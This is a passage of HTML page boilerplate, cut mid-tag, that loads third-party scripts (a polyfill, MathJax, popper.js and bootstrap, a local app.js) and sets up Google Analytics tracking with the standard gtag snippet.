src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
